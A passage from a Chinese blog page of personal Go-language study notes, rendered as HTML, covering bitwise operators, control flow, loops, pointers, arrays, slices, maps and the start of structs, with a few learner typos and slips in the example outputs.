class="headerlink" title="位运算"></a>位运算</h2><h3 id="与运算-按位与"><a href="#与运算-按位与" class="headerlink" title="与运算(按位与)"></a>与运算(按位与)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h <span class="hljs-type">int</span> = <span class="hljs-number">189</span>         <span class="hljs-comment">//128+32+16+8+4+1    1011 1101</span><br><span class="hljs-keyword">var</span> i <span class="hljs-type">int</span> = <span class="hljs-number">245</span>         <span class="hljs-comment">//128+64+32+16+4+1   1111 0101</span><br><span class="hljs-keyword">var</span> m <span class="hljs-type">int</span> = h &amp; i<br>fmt.Println(m)          <span class="hljs-comment">//181                1011 0101</span><br></code></pre></td></tr></table></figure><p>位一样的变为1,不一样的为0</p><p><code>&amp;</code></p><h3 id="或运算-按位或"><a href="#或运算-按位或" class="headerlink" title="或运算(按位或)"></a>或运算(按位或)</h3><p>都是0为0,其余为1</p><p><code>|</code></p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>两位一样则为0,不一样则为1</p><p><code>^</code></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符 &lt;&lt;"></a>左移运算符 &lt;&lt;</h3><p>高位抛弃,低位补零</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h <span class="hljs-type">int</span> = <span class="hljs-number">189</span>         <span class="hljs-comment">//1011 1101</span><br><span class="hljs-keyword">var</span> j <span class="hljs-type">int</span> = h &lt;&lt; <span class="hljs-number">3</span>      <span class="hljs-comment">//1011110 1000   -&gt;    1110 1000 </span><br>fmt.Println(j)          <span class="hljs-comment">//232</span><br></code></pre></td></tr></table></figure><h3 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符 &gt;&gt;"></a>右移运算符 &gt;&gt;</h3><p>符号位是什么就补什么</p><p>int默认是64位,正数的符号位是0,则右移之后原来的位置补0</p><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> flag <span class="hljs-type">int</span><br>fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;flag)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-number">10</span> &#123;               <span class="hljs-comment">//go的if中没有()</span><br>fmt.Println(<span class="hljs-string">&quot;yes&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> flag &gt;= <span class="hljs-number">11</span> &amp;&amp; flag &lt;= <span class="hljs-number">20</span> &#123;<br>fmt.Println(<span class="hljs-number">15</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-number">21</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> flag &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:                         <span class="hljs-comment">//如果flag是1</span><br>fmt.Println(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>fmt.Println(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>, <span class="hljs-number">4</span>:                     <span class="hljs-comment">//如果flag是3或4</span><br>fmt.Println(<span class="hljs-string">&quot;3 | 4&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;大于4&quot;</span>)        <span class="hljs-comment">//else</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i:=<span class="hljs-number">1</span>; i&lt;=<span class="hljs-number">10</span>; i+=<span class="hljs-number">4</span>&#123;<br>fmt.Println(i)<br>&#125;<br><br><span class="hljs-keyword">for</span> x := <span class="hljs-number">1</span>; x &lt;= <span class="hljs-number">9</span>; x++ &#123;<br><span class="hljs-keyword">for</span> y := <span class="hljs-number">1</span>; y &lt;= x; y++ &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d*%d=%d&quot;</span>, y, y, y * y)<br>&#125;<br>fmt.Println()<br>&#125;<br><br><span class="hljs-comment">//这种主要用于循环数组和字符串等</span><br><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span> = <span class="hljs-string">&quot;abcdefg&quot;</span><br><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> str &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d %c&quot;</span>, index, value)<br>fmt.Println()<br>&#125;<br><span class="hljs-comment">//index和value不是默认的,只是两个接收内容的变量,也可以用占位符_替代,名字是什么都可以,比如inde和valu</span><br><span class="hljs-comment">//for _,_ := range 变量名&#123;&#125;</span><br><span class="hljs-comment">//如果只想获得index,后面的可以不写,占位符也不用写,但如果指向获得后面的,则前面的必须写占位符</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//continue</span><br><span class="hljs-keyword">for</span> i:= <span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++&#123;<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">5</span>&#123;<br><span class="hljs-keyword">continue</span><br>    &#125;<br>    fmt.Println(i)<br>&#125;<br><span class="hljs-comment">//结果是1 2 3 4 6 7 8 9 10</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//break</span><br><span class="hljs-keyword">for</span> i:= <span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++&#123;<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">5</span>&#123;<br><span class="hljs-keyword">break</span><br>    &#125;<br>    fmt.Println(i)<br>&#125;<br><span class="hljs-comment">//结果是1 2 3 4</span><br><span class="hljs-comment">//如果是嵌套循环,则</span><br><span class="hljs-keyword">for</span> x := <span class="hljs-number">1</span>; x &lt;= <span class="hljs-number">2</span>; x++ &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>fmt.Println(i)<br>&#125;<br>&#125;<br><span class="hljs-comment">//结果是1 2 3 4 1 2 3 4,只跳出一层循环</span><br></code></pre></td></tr></table></figure><h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a>指针和数组</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> num * <span class="hljs-type">int</span> = <span class="hljs-literal">nil</span>       <span class="hljs-comment">//初始化一个空指针,nil就是null的意思</span><br><span class="hljs-keyword">var</span> numa <span class="hljs-type">int</span> = <span class="hljs-number">123</span><br>num = &amp;numa<br>fmt.Println(num)      <span class="hljs-comment">//输出0xc0000a6058</span><br>fmt.Pritln(*num)      <span class="hljs-comment">//输出123</span><br>*num = <span class="hljs-number">234</span><br>fmt.Println(*num, numa)  <span class="hljs-comment">//输出234 234</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//空指针</span><br><span class="hljs-keyword">var</span> n *<span class="hljs-type">int</span> = <span class="hljs-literal">nil</span><br>fmt.Println(n, *n)<br>*n = <span class="hljs-number">500</span><br>fmt.Println(n, *n)<br><span class="hljs-comment">//会报错</span><br><span class="hljs-comment">/*panic: runtime error: invalid memory address or nil pointer dereference</span><br><span class="hljs-comment">[signal 0xc0000005 code=0x0 addr=0x0 pc=0x9adf7c]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">goroutine 1 [running]:</span><br><span class="hljs-comment">main.main()</span><br><span class="hljs-comment">        d:/桌面/go/first/hello.go:15 +0x15c</span><br><span class="hljs-comment">exit status 2*/</span><br><span class="hljs-comment">//报错原因是本来n是空指针,所以没有占用内存空间,不能进行直接赋值</span><br><br><span class="hljs-keyword">var</span> n *<span class="hljs-type">int</span> = <span class="hljs-literal">nil</span><br>n = <span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>)<br>fmt.Println(n, *n)<br>*n = <span class="hljs-number">500</span><br>fmt.Println(n, *n)<br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//0xc0000160d8 0</span><br><span class="hljs-comment">//0xc0000160d8 500</span><br></code></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">4</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>&#125;<br>arr[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;123&quot;</span><br>fmt.Println(arr[<span class="hljs-number">3</span>])<br><span class="hljs-comment">//结果是123</span><br><span class="hljs-comment">//可以直接打印</span><br>fmt.Println(arr)<br><span class="hljs-comment">//打印数组</span><br><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> arr &#123;<br>fmt.Println(value, index)<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">apple 0</span><br><span class="hljs-comment">orange 1</span><br><span class="hljs-comment">pear 2</span><br><span class="hljs-comment">123 3</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//多维数组</span><br><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">3</span>][<span class="hljs-number">2</span>]<span class="hljs-type">string</span>&#123;<br>&#123;<span class="hljs-string">&quot;11&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>&#125;,      <span class="hljs-comment">//用逗号分隔</span><br>&#123;<span class="hljs-string">&quot;21&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>&#125;, <br>&#123;<span class="hljs-string">&quot;31&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>&#125;&#125;      <span class="hljs-comment">//最后一个括号一定要在同一行否则会报错</span><br>fmt.Println(arr[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>])   <br><span class="hljs-comment">//打印多维数组</span><br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> arr &#123;        <span class="hljs-comment">//这里的每个value都是一个一维数组</span><br><span class="hljs-keyword">for</span> _, va := <span class="hljs-keyword">range</span> value &#123;<br>fmt.Println(va)        <span class="hljs-comment">//这里的va是一个值</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="切片-slice"><a href="#切片-slice" class="headerlink" title="切片(slice)"></a>切片(slice)</h2><p>可以理解成可变长度的数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;    <span class="hljs-comment">//数组不写len,默认为切片</span><br>s1 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)  <span class="hljs-comment">//make(slice(slice就是[])/map/chan,初始时有多少个元素(len),最大有多少个元素(cap))</span><br><span class="hljs-comment">//甚至可以建立一个内部元素是map的切片   s1:=make([]map[string]string,2,6)</span><br>fmt.Println(s1)        <span class="hljs-comment">//结果是[0 0 0 0]</span><br>s1[<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>              <span class="hljs-comment">//直接修改只能在初始范围内修改,想增加需要额外函数</span><br>fmt.Println(s1)        <span class="hljs-comment">//[0,5]</span><br><span class="hljs-comment">//append函数可以对切片进行增加/扩容操作</span><br>s1 = <span class="hljs-built_in">append</span>(s1, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>fmt.Println(s1)      <span class="hljs-comment">//[0 5 2 3]</span><br>s1 = <span class="hljs-built_in">append</span>(s1, <span class="hljs-number">55</span>)<br>fmt.Println(s1)      <span class="hljs-comment">//本来s1最大容纳元素是5,但append函数可以自动扩容(cap翻倍),在上一步直接append(s1,2,3,55)也可以,后面新添加的元素数量没有限制</span><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>s1 = <span class="hljs-built_in">append</span>(s1, s2...)    <span class="hljs-comment">//也可以在一个切片后直接添加一个切片,但后面的切片必须带上...</span><br>fmt.Println(s1)       <span class="hljs-comment">//[0 5 2 3 55 0]</span><br>fmt.Printf(<span class="hljs-string">&quot;%d %d&quot;</span>, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))   <span class="hljs-comment">//6 8</span><br></code></pre></td></tr></table></figure><h3 id="切片直接引用数组"><a href="#切片直接引用数组" class="headerlink" title="切片直接引用数组"></a>切片直接引用数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>fmt.Println(arr)<br>s1 := arr[:<span class="hljs-number">2</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%d %d&quot;</span>, <span class="hljs-built_in">cap</span>(s1), s1)  <span class="hljs-comment">//4 [1 2]    cap默认是原数组长度</span><br>s2 := arr[:]      <span class="hljs-comment">//必须加[:],否则s2将是数组而不是切片</span><br>fmt.Println(s2)          <span class="hljs-comment">//默认是全取 [1 2 3 4]</span><br>s3 := arr[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]           <span class="hljs-comment">//左闭右开实际是第2和3个元素(0 1 2 3的顺序)</span><br>fmt.Println(s3)         <span class="hljs-comment">//[3 4]</span><br><span class="hljs-comment">//对数组的直接引用,会使切片指向数组,数组改变,切片也会改变,但当切片扩容之后,会自动指向新的数组,原数组改变,切片不再改变</span><br><span class="hljs-comment">//切片引用数组,本质是获取了数组的指针,所以切片改变,数组也会改变</span><br></code></pre></td></tr></table></figure><h3 id="copy函数"><a href="#copy函数" class="headerlink" title="copy函数"></a>copy函数</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>fmt.Println(s1)<br>s2 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;<br><span class="hljs-comment">//情况1</span><br><span class="hljs-built_in">copy</span>(s1, s2)      <span class="hljs-comment">//s1是被赋值的(待操作),s2是进行赋值的</span><br>fmt.Println(s1, s2)   <span class="hljs-comment">//[7 8 3 4]  [3 4]</span><br><span class="hljs-comment">//情况2</span><br><span class="hljs-built_in">copy</span>(s2,s1)    <span class="hljs-comment">//s1长度大于s2时,s2会被全部修改,但不会被扩容</span><br>fmt.Println(s2) <span class="hljs-comment">//[1 2]</span><br><span class="hljs-comment">//情况3</span><br><span class="hljs-comment">//可以手动选择从哪里开始赋值</span><br><span class="hljs-built_in">copy</span>(s1, s2[:<span class="hljs-number">1</span>])<br>fmt.Println(s1)    <span class="hljs-comment">//[7 2 3 4]</span><br><span class="hljs-comment">//情况4</span><br><span class="hljs-built_in">copy</span>(s1[<span class="hljs-number">2</span>:], s2[:<span class="hljs-number">1</span>])<br>fmt.Println(s1)    <span class="hljs-comment">//[1 2 7 4]</span><br></code></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>就是键值对</p><p>使用map过程中需要注意的几点： </p><ul><li>map是无序的，每次打印出来的map都会不一样，它不能通过index获取，而必须通过key获取</li><li>map的长度是不固定的，也就是和slice一样，也是一种引用类型</li><li>内置的len函数同样适用于map，返回map拥有的key的数量 </li><li>map的key可以是所有可比较的类型，如布尔型、整数型、浮点型、复杂型、字符串型……</li></ul><h3 id="创建map"><a href="#创建map" class="headerlink" title="创建map"></a>创建map</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//直接创建,当不赋值时为nil,不能直接更改</span><br><span class="hljs-keyword">var</span> map1 <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>       <span class="hljs-comment">//map是类型,int是键名的变量类型,string是键值的变量类型</span><br><span class="hljs-comment">//用make创建,即使没赋值也不是nil,可以直接使用</span><br>map2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>)   <span class="hljs-comment">//只有map可以这样,slice必须加len和cap,chan可以加cap也可以不加cap</span><br><span class="hljs-comment">//直接创建并赋值</span><br>map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;html&quot;</span>: <span class="hljs-number">60</span>, <span class="hljs-string">&quot;css&quot;</span>: <span class="hljs-number">70</span>, <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-number">80</span>&#125;     <span class="hljs-comment">//中间用逗号分隔,赋值用冒号</span><br></code></pre></td></tr></table></figure><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//可以直接进行增加/修改键值对</span><br>map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;html&quot;</span>: <span class="hljs-number">60</span>, <span class="hljs-string">&quot;css&quot;</span>: <span class="hljs-number">70</span>, <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-number">80</span>&#125;<br>fmt.Println(map1)    <span class="hljs-comment">//map[css:70 html:60 js:80]</span><br>map1[<span class="hljs-string">&quot;py&quot;</span>] = <span class="hljs-number">50</span><br>fmt.Println(map1)    <span class="hljs-comment">//map[css:70 html:60 js:80 py:50]</span><br><br><span class="hljs-comment">//删除需要用到delete函数</span><br><span class="hljs-built_in">delete</span>(map1,<span class="hljs-string">&quot;py&quot;</span>)  <span class="hljs-comment">//如果键名是int就不用加引号,这里是因为是字符串才加的引号</span><br>fmt.Println(map1)   <span class="hljs-comment">//map[css:70 html:60 js:80]</span><br></code></pre></td></tr></table></figure><h3 id="map遍历-map是无序的"><a href="#map遍历-map是无序的" class="headerlink" title="map遍历(map是无序的)"></a>map遍历(map是无序的)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//int:string型</span><br>map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-number">1</span>: <span class="hljs-string">&quot;太极&quot;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&quot;两仪&quot;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&quot;四象&quot;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&quot;八卦&quot;</span>&#125;<br>keys := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(map1))<br>fmt.Println(keys)<br><span class="hljs-keyword">for</span> index := <span class="hljs-keyword">range</span> map1 &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, index)<br>&#125;<br>fmt.Println(keys)<br>sort.Ints(keys)<br><span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> keys &#123;<br>fmt.Println(k, map1[k])<br>&#125;<br><span class="hljs-comment">//string:int型</span><br>map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;html&quot;</span>: <span class="hljs-number">60</span>, <span class="hljs-string">&quot;css&quot;</span>: <span class="hljs-number">70</span>, <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-number">80</span>&#125;<br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> map1 &#123;<br>fmt.Println(k, v)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>在一个函数中,如果有内层函数,则在外层函数定义的局部变量可以被内层函数不经调用直接使用,并且如果变量被内层函数使用后,在外层函数也结束后,该局部变量不会被释放(类似c的const)</p><h2 id="指针-1"><a href="#指针-1" class="headerlink" title="指针"></a>指针</h2><h3 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h3><p>本质是指针,指向数组的地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr := [<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;<br><span class="hljs-keyword">var</span> p *[<span class="hljs-number">4</span>]<span class="hljs-type">int</span><br>p=&amp;arr           <span class="hljs-comment">//p有自己的地址,但是p指向数组的地址</span><br></code></pre></td></tr></table></figure><h3 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h3><p>本质是数组,存储的内容是指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">a:=<span class="hljs-number">1</span><br>b:=<span class="hljs-number">2</span><br>c:=<span class="hljs-number">3</span><br>d:=<span class="hljs-number">4</span><br>arr1:=[<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;a,b,c,d&#125;<br>arr2:=[<span class="hljs-number">4</span>]*<span class="hljs-type">int</span>&#123;&amp;a,&amp;b,&amp;c,&amp;d&#125;<br>arr1[<span class="hljs-number">0</span>] = <span class="hljs-number">5</span><br>fmt.Println(a)   <span class="hljs-comment">//1</span><br>*arr2[<span class="hljs-number">0</span>] = <span class="hljs-number">5</span><br>fmt.Println(a)   <span class="hljs-comment">//5</span><br><span class="hljs-comment">//数组的直接赋值时深拷贝,如果时指针数组则是浅拷贝</span><br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm">*[<span class="hljs-number">4</span>] <span class="hljs-keyword">type</span>  先指针再数组,所以是数组指针<br>[<span class="hljs-number">4</span>]* <span class="hljs-keyword">type</span>  先数组再指针,所以是指针数组<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230803203526.png"></p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>结构体内部是结构体的属性,而在外部创建对象,并给对象的属性赋值</p><h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> p1 person    <span class="hljs-comment">//创建一个对象</span><br>p1.age = <span class="hljs-number">18</span><br>p1.name = <span class="hljs-string">&quot;小明&quot;</span><br>p1.sex = <span class="hljs-string">&quot;m&quot;</span><br>fmt.Println(p1)<br>  